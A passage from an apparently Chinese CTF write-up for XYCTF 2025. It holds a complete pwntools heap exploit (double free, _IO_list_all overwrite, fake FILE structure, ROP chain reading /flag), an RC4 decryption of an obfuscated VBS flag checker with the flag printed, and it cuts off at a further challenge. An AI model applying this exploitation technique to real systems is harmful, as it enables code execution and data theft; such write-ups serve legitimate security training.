<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># context.terminal=[&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;start&quot;, &quot;cmd.exe&quot;, &quot;/c&quot;, &quot;wsl.exe&quot;, &quot;-e&quot;]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./heap2&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;8.147.132.32&quot;,28042)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">b&quot;a&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;data&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">out</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x1000</span></span><br><span class="line">add(<span class="number">0x280</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x280</span>)  <span class="comment">#1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x280</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recv()</span><br><span class="line">key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base= (key&lt;&lt;<span class="number">12</span>) - <span class="number">0x15000</span> <span class="comment">#+ offset</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x203b20</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">_IO_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps =libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gadget1 = libc_base + <span class="number">0x17923d</span>      <span class="comment">#svcudp_reply+29</span></span><br><span class="line">gadget2 = libc_base + <span class="number">0x5814D</span>       <span class="comment">#swapcontext</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010f75b</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000110a4d</span></span><br><span class="line">pop_rsi_rbp_ret = libc_base + <span class="number">0x000000000002b46b</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x00000000000dd237</span></span><br><span class="line">mov_edx_ebx_3pop_ret = libc_base + <span class="number">0x00000000000b0124</span>        <span class="comment">#mov edx, ebx ; pop rbx ; pop r12 ; pop rbp ; ret  </span></span><br><span class="line">mov_edx_ebp_4pop_ret = libc_base + <span class="number">0x00000000000b00c8</span>        <span class="comment">#mov edx, ebp ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000028a91</span></span><br><span class="line">pop_rbx_ret = libc_base + <span class="number">0x00000000000586d4</span></span><br><span class="line">syscall = libc_base + <span class="number">0x0000000000187A81</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002882f</span></span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">chunk9 =  heap_base + <span class="number">0x16090</span>   <span class="comment">#(key&lt;&lt;12) + 0x1000 + 0x90      #</span></span><br><span class="line">chunk10 = heap_base + <span class="number">0x16320</span> + <span class="number">0x10</span>    <span class="comment">#(key&lt;&lt;12) + 0x1000 + 0x320 + 0x10   #</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) <span class="comment">#_write_base,_write_ptr</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)+p64(<span class="number">0</span>) <span class="comment">#_IO_buf_base,_IO_buf_end</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) + p64(chunk10+<span class="number">0x108</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x3000</span>)   <span class="comment">#lock</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(chunk10)    <span class="comment">#_wide_data</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)            <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)       <span class="comment">#setcontext-&gt;rsp</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)     <span class="comment">#setcontext-&gt;rcx</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0xe0</span>+p64(chunk10+<span class="number">0x100</span>-<span class="number">0x68</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(gadget1)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x5000</span>)+p64(chunk10+<span class="number">0x118</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(gadget2)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(chunk10+<span class="number">0x250</span>) + p64(ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(heap_base+<span class="number">0x5000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += <span class="string">b&quot;/flag\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop = p64(pop_rdi_ret) + p64(chunk10+<span class="number">0x200</span>) + p64(pop_rsi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rbx_ret) + p64(<span class="number">0</span>) + p64(mov_edx_ebx_3pop_ret) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_rbp_ret) + p64(heap_base+<span class="number">0x5000</span>)*<span class="number">2</span> + p64(pop_rbx_ret) + p64(<span class="number">0x50</span>) + p64(mov_edx_ebx_3pop_ret) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_rbp_ret) + p64(heap_base+<span class="number">0x5000</span>)*<span class="number">2</span> + p64(pop_rbx_ret) + p64(<span class="number">0x50</span>) + p64(mov_edx_ebx_3pop_ret) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x250</span>,<span class="string">b&quot;\x00&quot;</span>) + rop</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add(<span class="number">0x280</span>,fake_IO_FILE) <span class="comment">#9</span></span><br><span class="line">delete(<span class="number">1</span>)   <span class="comment">#double free</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;key:&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x320</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x288</span>+p64(<span class="number">0x291</span>)+p64((_IO_list_all)^(key-<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,payload)     <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x280</span>)  <span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x280</span>,p64(chunk9))  <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line">out()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h4 id="re-warmup">re-WARMUP</h4>
<p>给了一个vbs文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406222411496.png"
                      class=""
                >
<p>可以直接用chatgpt一把梭，我们也可以先把每个chr算好提取出来看看大概逻辑是什么。其中有一些计算结果不在ascii范围之内，我们可以略过。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新读取 VBS 文件内容（由于状态已重置）</span></span><br><span class="line">file_path = <span class="string">r&quot;E:\ctf\xyctf2025\re\VBS\VBS\chal.vbs&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    vbs_code = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配所有 Chr(x [+|-] y [+|-] z ...) 形式的内容</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;Chr\((.*?)\)&quot;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_chr_expression</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">eval</span>(expr))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Chr(<span class="subst">&#123;expr&#125;</span>)&quot;</span>  <span class="comment"># 保留原始表达式如果失败</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换 Chr 表达式为其对应的字符</span></span><br><span class="line">decoded_code = pattern.findall(vbs_code)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> decoded_code:</span><br><span class="line">    item = item.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;//&quot;</span>)</span><br><span class="line">    <span class="comment"># print(item)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(item)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Chr(<span class="subst">&#123;item&#125;</span>)&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>得到结果大概长这样，其实已经可以明显看出rc4的加密逻辑了：</p>
<div class="highlight-container" data-rel="Vbscript"><figure class="iseeu highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = <span class="built_in">InputBox</span>(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span> <span class="comment">&#x27; Chr( -5840+114 )Chr( -37790+6278 )Chr( -8.231351E+07//3957 )Chr( -14110+7864 )Chr( -30457-1205 )C4Chr( 517-7291 )Chr( -31263+6916 )Chr( -29685+9083 )Chr( -2.138515E+07//3442 )Chr( -26304-1370 )Chr( -1.510879E+08//6060 )Chr( -903-3261 )Chr( -22484-8007 )Chr( -34437+5126 )Chr( -10635+3856 )Chr( -1.97004E+08//9374 )Chr( -1.079768E+08//6550 )Chr( -2.533546E+07//3739 )Chr( -25645+6931 )Chr( -1.720817E+08//7056 )Chr( -12498+5774 )Chr( -2.164872E+08//7546 )Chr( -8955-8316 )</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Chr( -5.682766E+07//8145 )Chr( -3.747722E+07//1805 )Chr( -20535-2876 )Chr( -5076000//750 )Chr( -28220-733 )Chr( -33583+7603 )RC4Chr( -4.203267E+07//6205 )Chr( -20128-4219 )Chr( -29090+8488 )Chr( -7954+1177 )Chr( -25730+8808 )Chr( -23859-3357 )</span></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; Chr( -10371+3595 )Chr( -21805-3310 )Chr( -1.930486E+08//8525 )Chr( -6242-530 )Chr( -2.479211E+08//9214 )Chr( -28712+8110 )Chr( 4047-9789 )?</span></span><br><span class="line">    kLen = <span class="built_in">Len</span>(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = <span class="built_in">Asc</span>(<span class="built_in">Mid</span>(strKey, (i Mod kLen) + <span class="number">1</span>, <span class="number">1</span>)) <span class="comment">&#x27; Chr( -13541+6804 )Chr( -7.75285E+07//2501 )Chr( -32055+4060 )Chr( -1318-5661 )Chr( -5.265648E+07//3209 )Chr( -31857+4377 )ASCIIChr( -2.477346E+07//3988 )Chr( -17020-9885 )Chr( -2542488//104 )</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; KSAChr( -16-6721 )Chr( -28078-2921 )Chr( -24670-3325 )Chr( -9340+3372 )Chr( -25211-6560 )Chr( -22908+5154 )</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) Mod <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; PRGAChr( 3060-9834 )Chr( -1.219054E+08//5007 )Chr( -16837-3765 )Chr( -13859+7384 )Chr( -40413+8132 )Chr( -7.735399E+07//3455 )</span></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> <span class="built_in">Len</span>(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) Mod <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) Mod <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line"></span><br><span class="line">        <span class="comment">&#x27; Chr( -5.053404E+07//7460 )Chr( -26034+1687 )Chr( -19313-1289 )Chr( -30-6697 )Chr( -17366-1346 )Chr( -15077-1903 )Chr( -6552-432 )Chr( -13927-3764 )Chr( -37232+7921 )Chr( 1107-7886 )Chr( -15477-5539 )Chr( -1.750707E+07//1062 )Chr( -3.826407E+07//5647 )?</span></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = <span class="built_in">Asc</span>(<span class="built_in">Mid</span>(sMessage, pos, <span class="number">1</span>)) <span class="comment">&#x27; Chr( -5.533603E+07//8508 )Chr( -1.094461E+07//378 )Chr( -19198-7803 )Chr( -1503-5013 )Chr( -22047-8352 )SCIIChr( -16376+9628 )Chr( -3.882402E+07//1232 )Chr( -35990+7452 )</span></span><br><span class="line">        cipherByte = s((s(i) + s(j)) Mod <span class="number">256</span>) <span class="keyword">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; <span class="built_in">Right</span>(<span class="string">&quot;0&quot;</span> &amp; <span class="built_in">Hex</span>(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; Chr( -15360+8376 )Chr( -1.435792E+08//8237 )Chr( -21866-10 )Chr( -4.86175E+07//8145 )Chr( -1.932544E+08//5987 )Chr( -19485+2053 )Chr( -10516-6235 )</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">LCase</span>(RunRC(flag, qwfe)) = <span class="built_in">LCase</span>(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure></div>
<p>之后直接rc4解密即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">cipher_hex = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span></span><br><span class="line">key = <span class="string">b&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line">cipher_bytes = binascii.unhexlify(cipher_hex)</span><br><span class="line">rc4 = ARC4.new(key)</span><br><span class="line">plaintext = rc4.decrypt(cipher_bytes)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(plaintext.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406223841395.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406224031766.png"
                      class=""
                >
<p>XYCTF{5f9f46c147645dd1e2c8044325d4f93c}</p>
<h4 id="re-dragon">re-Dragon</h4>
<p><code>.bc</code> 文件是 LLVM 编译生成的 <strong>bitcode
文件</strong>，也叫“中间表示 IR（Intermediate
Representation）”，不是机器码，也不是源代码，而是一种 LLVM
的中间形式。我们可以通过<code>llvm-dis-17</code>来将其转换成人类可读的
LLVM IR（文本形式）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406224346310.png"
                      class=""
                >
<p>反编译出来的程序如下：</p>
<div class="highlight-container" data-rel="Less"><figure class="iseeu highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span 